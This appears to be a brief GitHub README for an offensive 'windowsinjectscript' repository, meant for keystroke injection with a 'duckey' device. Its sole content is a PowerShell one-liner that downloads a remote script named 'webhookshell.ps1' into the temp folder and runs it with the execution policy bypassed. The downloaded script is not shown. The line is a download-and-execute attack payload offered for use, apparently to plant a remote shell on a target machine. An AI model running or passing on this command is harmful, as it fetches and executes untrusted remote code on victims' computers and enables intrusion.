# windowsinjectscript
This is the PS1 script for injecting in duckey



### 

- This is the code to run the program

```
$p=Join-Path $env:TEMP 'webhookshell.ps1'; Invoke-WebRequest 'https://raw.githubusercontent.com/jvs-alpha/windowsinjectscript/refs/heads/main/webhookshell.ps1' -OutFile $p; powershell -NoProfile -ExecutionPolicy Bypass -File $p
```